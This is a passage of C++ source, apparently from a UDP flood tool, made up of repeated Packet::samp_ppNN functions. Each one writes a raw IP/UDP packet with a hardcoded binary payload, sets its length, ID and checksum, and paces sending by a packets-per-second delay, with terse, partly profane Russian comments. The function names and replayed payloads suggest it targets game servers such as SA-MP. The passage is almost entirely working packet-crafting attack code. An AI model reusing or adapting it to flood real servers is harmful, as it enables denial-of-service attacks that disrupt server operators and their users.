	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x01\x00\x32\x28\x06\x3d\xa2\x00\x00\x03\x00\x87\x00\x29\x04\x00\x64\x90\x09\x33\x38\x68\x2b\x3d\xa2\x00\x00\x05\x00\x91\x00\x00\x23\xc0\x14\x3c\xe2\x03\xea\x20\x00\x00\x06\x00\x91\x00\x80\x1e\xc1\x00\x14\x8b\xda\x61\x08\x00\x80\x38\x8d\x00\x00\x8c\x42\x41\xe0\x00\x00\x00\x00\x10\x10\x00\x00\x00\xc0\x16\xf1\x20\x33\xc0\x00\x00\x00\x00\xa0\x00\x00\x00\xa0\x00\x00\x00\xa0\x00\x00\x00\x08\x00\x00\x00\x04\x00\x00\x00\x41\x4d\x04\xb5\x35\x40\x80\xc0\xb8\xcc\x81\x4d\x95\xc9\xd9\x95\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp15(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 186; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x0f\x00\x48\x85\x40\x11\x00\x14\x98\xf8\x06\x1f\x00\x91\x0b\x00\x23\xc0\x14\x92\xe2\x07\x67\x04\x83\xc0\x20\x00\x91\x0b\x80\x22\x00\x14\x5e\xf8\x15\x21\x00\x91\x0c\x00\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x22\x00\x91\x0c\x80\x22\x00\x14\x58\xf8\x0a\x23\x00\x91\x0d\x00\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\x24\x00\x91\x0d\x80\x22\x00\x14\x14\xf0\xf0\x25\x00\x91\x0e\x00\x27\xc0\x14\x5a\xe6\x09\xc6\x18\x1c\x26\x08\xa1\xbc\x01\xe9\x64\xa4\x20\x26\x00\x91\x0e\x80\x0c\x60\x20\x14\x2c\xc8\x00\x20\x40\x09\x86\x40\x00\x1a\x1f\x7d\x58\x68\x10\x54\x18\x9f\x38\xc2\xc8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp16(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 186; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x13\x80\x48\x87\x80\x11\x00\x14\x98\xf8\x25\x28\x00\x91\x0f\x80\x23\xc0\x14\x92\xe2\x0a\xa4\xe3\x23\xd0\x29\x00\x91\x10\x00\x22\x00\x14\x5e\xf8\x17\x2a\x00\x91\x10\x80\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x2b\x00\x91\x11\x00\x22\x00\x14\x58\xf8\x03\x2c\x00\x91\x11\x80\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\x2d\x00\x91\x12\x00\x22\x00\x14\x14\xf0\xf0\x2e\x00\x91\x12\x80\x27\xc0\x14\x5a\xe6\x0a\x03\x4b\x94\x0e\x08\x09\x14\x06\xda\xfb\xa4\x20\x2f\x00\x91\x13\x00\x0c\x60\x20\x14\x2c\xc8\x00\x20\x60\x0b\xa4\x60\x00\x01\xc6\x50\xa8\x97\xd4\x3c\xe8\x8b\xc3\x03\x18\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp17(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 186; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x52\x80\x48\xa7\x00\x11\x00\x14\x98\xf8\x28\xa6\x00\x91\x4e\x80\x23\xc0\x14\x92\xe2\x03\x8a\xd8\x03\xd0\xa7\x00\x91\x4f\x00\x22\x00\x14\x5e\xf8\x15\xa8\x00\x91\x4f\x80\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xa9\x00\x91\x50\x00\x22\x00\x14\x58\xf8\x03\xaa\x00\x91\x50\x80\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\xab\x00\x91\x51\x00\x22\x00\x14\x14\xf0\xf0\xac\x00\x91\x51\x80\x27\xc0\x14\x5a\xe6\x00\xe4\x72\x2c\x20\x02\xa9\xb4\x11\x09\x43\x1c\x10\xad\x00\x91\x52\x00\x0c\x60\x20\x14\x2c\xc8\x00\x22\x20\x0d\x03\xe0\x00\x15\x12\xa6\x38\x9d\x3b\xa0\xd8\xb0\x1c\xf0\x48\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp18(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 510; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\xe2\x11\x00\x12\x00\xae\x00\x91\x52\x80\x22\x00\x14\x98\xf8\x0e\xaf\x00\x91\x53\x00\x23\xc0\x14\x92\xe2\x06\xcf\x45\x13\xc0\xb0\x00\x91\x53\x80\x22\x00\x14\x5e\xf8\x12\xb1\x00\x91\x54\x00\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xb2\x00\x91\x54\x80\x22\x00\x14\x58\xf8\x06\xb3\x00\x91\x55\x00\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\xb4\x00\x91\x55\x80\x22\x00\x14\x14\xf0\xf0\xb5\x00\x91\x56\x00\x27\xc0\x14\x5a\xe6\x03\xa3\x2c\x2c\x26\xd8\x5b\x5c\x27\x75\x39\x84\x20\xb6\x00\x91\x56\x80\x0c\x60\x20\x14\x2c\xc8\x00\x22\x40\x1c\x46\xc0\x00\x08\xa2\x59\x58\x88\x98\x00\x08\x9a\x67\xb4\x38\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xb7\x00\x91\x57\x00\x22\x00\x14\x98\xf8\x2a\xb8\x00\x91\x57\x80\x23\xc0\x14\x92\xe2\x01\x1b\x6b\xe3\xd0\xb9\x00\x91\x58\x00\x22\x00\x14\x5e\xf8\x00\xba\x00\x91\x58\x80\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xbb\x00\x91\x59\x00\x22\x00\x14\x58\xf8\x18\xbc\x00\x91\x59\x80\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\xbd\x00\x91\x5a\x00\x22\x00\x14\x14\xf0\xf0\xbe\x00\x91\x5a\x80\x27\xc0\x14\x5a\xe6\x01\xf1\xa9\xfc\x27\x59\xdc\x3c\x23\x0b\x9d\x94\x10\xbf\x00\x91\x5b\x00\x0c\x60\x20\x14\x2c\xc8\x00\x22\x60\x1c\x21\x20\x00\x0b\xc6\xfd\x88\x80\xb3\xc3\x98\xba\x0e\x1d\xf8\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xc0\x00\x91\x5b\x80\x22\x00\x14\x98\xf8\x31\xc1\x00\x91\x5c\x00\x23\xc0\x14\x92\xe2\x0c\x92\x51\xb3\xd0\xc2\x00\x91\x5c\x80\x22\x00\x14\x5e\xf8\x0e\xc3\x00\x91\x5d\x00\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xc4\x00\x91\x5d\x80\x22\x00\x14\x58\xf8\x0b\xc5\x00\x91\x5e\x00\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\xc6\x00\x91\x5e\x80\x22\x00\x14\x14\xf0\xf0\xc7\x00\x91\x5f\x00\x27\xc0\x14\x5a\xe6\x01\x85\xed\xd4\x1d\xcd\x9a\xec\x1c\x17\x18\x14\x20", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp19(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 535; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x64\x00\x48\xaf\xc0\x06\x30\x10\x14\x2c\xc8\x00\x22\x80\x0d\xc3\xe0\x00\x08\xbb\xfe\xf8\x8f\xe9\x84\x48\xb8\x0d\x6e\x48\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xc9\x00\x91\x60\x00\x22\x00\x14\x98\xf8\x21\xca\x00\x91\x60\x80\x23\xc0\x14\x92\xe2\x0c\xdc\xb8\xe3\xc0\xcb\x00\x91\x61\x00\x22\x00\x14\x5e\xf8\x0b\xcc\x00\x91\x61\x80\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xcd\x00\x91\x62\x00\x22\x00\x14\x58\xf8\x09\xce\x00\x91\x62\x80\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\xcf\x00\x91\x63\x00\x22\x00\x14\x14\xf0\xf0\xd0\x00\x91\x63\x80\x27\xc0\x14\x5a\xe6\x0a\xa4\x9a\x9c\x29\xe4\x29\x3c\x2d\x42\xe4\x6c\x20\xd1\x00\x91\x64\x00\x0c\x60\x20\x14\x2c\xc8\x00\x22\xa0\x11\xe0\xc0\x00\x17\x3b\xe0\x88\xae\xba\x63\xf8\xad\x7f\xc3\x48\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xd2\x00\x91\x64\x80\x22\x00\x14\x98\xf8\x1e\xd3\x00\x91\x65\x00\x23\xc0\x14\x92\xe2\x03\xf1\xbf\x93\xc0\xd4\x00\x91\x65\x80\x22\x00\x14\x5e\xf8\x00\xd5\x00\x91\x66\x00\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xd6\x00\x91\x66\x80\x22\x00\x14\x58\xf8\x10\xd7\x00\x91\x67\x00\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\xd8\x00\x91\x67\x80\x22\x00\x14\x14\xf0\xf0\xd9\x00\x91\x68\x00\x27\xc0\x14\x5a\xe6\x0f\x23\xd0\xf4\x29\xe8\x03\xd4\x28\xbb\x4b\x24\x20\xda\x00\x91\x68\x80\x0c\x60\x20\x14\x2c\xc8\x00\x22\xc0\x07\xa4\xe0\x00\x10\x13\xbf\xb8\x75\x9e\x22\x78\xad\x6d\x99\x38\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xdb\x00\x91\x69\x00\x22\x00\x14\x98\xf8\x21\xdc\x00\x91\x69\x80\x23\xc0\x14\x92\xe2\x01\xb7\xa1\x03\xd0\xdd\x00\x91\x6a\x00\x22\x00\x14\x5e\xf8\x07\xde\x00\x91\x6a\x80\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xdf\x00\x91\x6b\x00\x22\x00\x14\x58\xf8\x10\xe0\x00\x91\x6b\x80\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\xe1\x00\x91\x6c\x00\x22\x00\x14\x14\xf0\xf0", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp20(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 498; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x71\x00\x48\xb6\x40\x13\xe0\x14\x5a\xe6\x0b\xac\xc5\x64\x22\x43\xa2\xcc\x20\x08\x71\x9b\xf0\xe3\x00\x91\x6d\x00\x0c\x60\x20\x14\x2c\xc8\x00\x22\xe0\x02\x80\x20\x00\x0d\xbe\xc1\xa8\xbc\x17\x59\x08\x4a\xdb\x47\x38\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xe4\x00\x91\x6d\x80\x1e\x80\x20\x14\x71\xda\x20\x20\x00\x00\x20\x00\x00\x1d\x54\x80\x00\x00\x20\x00\x00\x02\x95\xc8\xf3\xdd\x8d\x22\x33\xc0\x00\x00\x00\x00\x00\x0b\x04\x20\x00\x0a\x44\x20\x00\x00\x00\x00\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x00\x00\x00\x00\x00\x00\x00\xe5\x00\x85\xb8\x14\x49\xec\x00\x30\x00\x00\x0a\x00\xf0\x00\x00\xc0\x00\x00\x07\xe7\x27\xe5\x06\x17\x76\xe6\x56\x42\xe2\xe2\xe0\xe6\x00\x91\x6e\x00\x22\x00\x14\x98\xf8\x13\xe7\x00\x91\x6e\x80\x23\xc0\x14\x92\xe2\x04\x42\xea\xc3\xc0\xe8\x00\x91\x6f\x00\x22\x00\x14\x5e\xf8\x08\xe9\x00\x91\x6f\x80\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xea\x00\x91\x70\x00\x22\x00\x14\x58\xf8\x05\xeb\x00\x91\x70\x80\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\xec\x00\x91\x71\x00\x22\x00\x14\x14\xf0\xf0\xed\x00\x91\x71\x80\x27\xc0\x14\x5a\xe6\x0e\xb1\x6a\x24\x21\x4a\x58\x34\x14\x56\xeb\x5c\x20\xee\x00\x91\x72\x00\x0c\x60\x20\x14\x2c\xc8\x00\x23\x00\x1a\x60\xa0\x00\x16\x59\x41\x18\xb6\x76\xd7\x78\x8d\x03\x9d\x08\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xef\x00\x91\x72\x80\x22\x00\x14\x98\xf8\x01\xf0\x00\x91\x73\x00\x23\xc0\x14\x92\xe2\x0d\x22\xab\x73\xc0\xf1\x00\x91\x73\x80\x22\x00\x14\x5e\xf8\x09\xf2\x00\x91\x74\x00\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xf3\x00\x91\x74\x80\x22\x00\x14\x58\xf8\x18\xf4\x00\x91\x75\x00\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\xf5\x00\x91\x75\x80\x22\x00\x14\x14\xf0\xf0\xf6\x00\x91\x76\x00\x27\xc0\x14\x5a\xe6\x08\xf5\x6a\x54\x29\x02\x33\x6c\x18\xc6\x3b\xbc\x10", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp21(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 505; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x73\x04\xc8\xb7\x02\x51\x00\x14\x98\xf8\x0c\xe7\x09\x91\x6e\x84\xa3\xc0\x14\x92\xe2\x02\x39\x6c\x73\xd0\xe8\x09\x91\x6f\x04\xa2\x00\x14\x5e\xf8\x12\xe9\x09\x91\x6f\x84\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xea\x09\x91\x70\x04\xa2\x00\x14\x58\xf8\x03\xeb\x09\x91\x70\x84\xa3\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\xec\x09\x91\x71\x04\xa2\x00\x14\x14\xf0\xf0\xed\x09\x91\x71\x84\xa7\xc0\x14\x5a\xe6\x02\x66\x45\x74\x27\x16\x79\x34\x2a\xd7\xa9\x04\x20\xee\x09\x91\x72\x04\x8c\x60\x20\x14\x2c\xc8\x00\x23\x00\x39\x02\x40\x00\x16\x57\xb9\xc8\x82\x0e\xd8\x78\x75\x91\x87\xf8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xef\x09\x91\x72\x84\xa2\x00\x14\x98\xf8\x1a\xf0\x09\x91\x73\x04\xa3\xc0\x14\x92\xe2\x0c\x8d\x5a\x73\xd0\xf1\x09\x91\x73\x84\xa2\x00\x14\x5e\xf8\x0d\xf2\x09\x91\x74\x04\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xf3\x09\x91\x74\x84\xa2\x00\x14\x58\xf8\x10\xf4\x09\x91\x75\x04\xa3\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\xf5\x09\x91\x75\x84\xa2\x00\x14\x14\xf0\xf0\xf6\x09\x91\x76\x04\xa7\xc0\x14\x5a\xe6\x07\xdd\x8b\x04\x20\x0b\x12\x6c\x0a\xc1\xc4\xac\x20\xf7\x09\x91\x76\x84\x8c\x60\x20\x14\x2c\xc8\x00\x23\x20\x20\x00\x60\x00\x08\x1e\xe2\xe8\x82\x39\x26\x48\xb5\xf0\x9b\x18\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xf8\x09\x91\x77\x04\xa2\x00\x14\x98\xf8\x1a\xf9\x09\x91\x77\x84\xa3\xc0\x14\x92\xe2\x0b\x81\x72\x03\xc0\xfa\x09\x91\x78\x04\xa2\x00\x14\x5e\xf8\x03\xfb\x09\x91\x78\x84\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\xfc\x09\x91\x79\x04\xa2\x00\x14\x58\xf8\x08\xfd\x09\x91\x79\x84\xa3\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\xfe\x09\x91\x7a\x04\xa2\x00\x14\x14\xf0\xf0\xff\x09\x91\x7a\x84\xa7\xc0\x14\x5a\xe6\x03\x49\x6a\x9c\x1f\x72\xbb\x9c\x2c\xf3\x0b\x64\x20", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp22(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 547; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x7f\x85\x48\xbd\x02\x91\xe0\x14\x92\xe2\x0b\x20\x69\x33\xd0\x00\x0b\x91\x7a\x85\x22\x00\x14\x5e\xf8\x01\x01\x0b\x91\x7b\x05\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x02\x0b\x91\x7b\x85\x22\x00\x14\x58\xf8\x13\x03\x0b\x91\x7c\x05\x23\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\x04\x0b\x91\x7c\x85\x22\x00\x14\x14\xf0\xf0\x05\x0b\x91\x7d\x05\x27\xc0\x14\x5a\xe6\x0f\x76\xb6\xac\x2f\x8a\xe4\x54\x1f\xaf\x1b\x2c\x20\x06\x0b\x91\x7d\x85\x0c\x60\x20\x14\x2c\xc8\x00\x26\xe0\x31\x43\x80\x00\x09\x3e\x81\xb8\xb7\x09\x32\xd8\x7a\x27\x27\x58\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x07\x0b\x91\x7e\x05\x22\x00\x14\x98\xf8\x0d\x08\x0b\x91\x7e\x85\x23\xc0\x14\x92\xe2\x07\x58\x23\x13\xd0\x09\x0b\x91\x7f\x05\x22\x00\x14\x5e\xf8\x12\x0a\x0b\x91\x7f\x85\x2e\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x0b\x0b\x91\x00\x05\xa2\x00\x14\x58\xf8\x18\x0c\x0b\x91\x00\x85\xa3\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\x0d\x0b\x91\x01\x05\xa2\x00\x14\x14\xf0\xf0\x0e\x0b\x91\x01\x85\xa7\xc0\x14\x5a\xe6\x00\x0f\x53\xd4\x1e\x68\x5a\x2c\x2d\xd4\x49\x9c\x20\x0f\x0b\x91\x02\x05\x8c\x60\x20\x14\x2c\xc8\x00\x27\x00\x24\x48\xc0\x00\x19\x56\x52\x78\x83\x33\xdf\xf8\x8e\x81\xc1\xf8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x10\x0b\x91\x02\x85\xa2\x00\x14\x98\xf8\x26\x11\x0b\x91\x03\x05\xa3\xc0\x14\x92\xe2\x09\x2b\x08\x53\xd0\x12\x0b\x91\x03\x85\xa2\x00\x14\x5e\xf8\x01\x13\x0b\x91\x04\x05\xae\x80\x14\x56\xec\xc0\x00\x00\x35\x04\x54\x40\xa5\x74\x14\xc4\xb5\xf4\x45\x25\x54\xe4\xb3\x33\x38\x34\x0f\x01\x00\x00\x00\x14\x0b\x91\x04\x85\xa2\x00\x14\x58\xf8\x0d\x15\x0b\x91\x05\x05\xa3\xc0\x14\x12\xe2\x00\x0e\x40\xb5\x40\x16\x0b\x91\x05\x85\xa2\x00\x14\x14\xf0\xf0\x17\x0b\x91\x06\x05\xa7\xc0\x14\x5a\xe6\x02\xa5\xf0\x7c\x2d\xf9\xaa\xbc\x2a\x0c\x6a\xac\x20\x18\x0b\x91\x06\x85\x8c\x60\x20\x14\x2c\xc8\x00\x27\x20\x23\xa3\xc0\x00\x12\x1d\x2c\xb8\x93\x40\x26\x78\xbd\xf0\x82\x88\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp23(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 372; //вес пакета udp/ip в байтах 
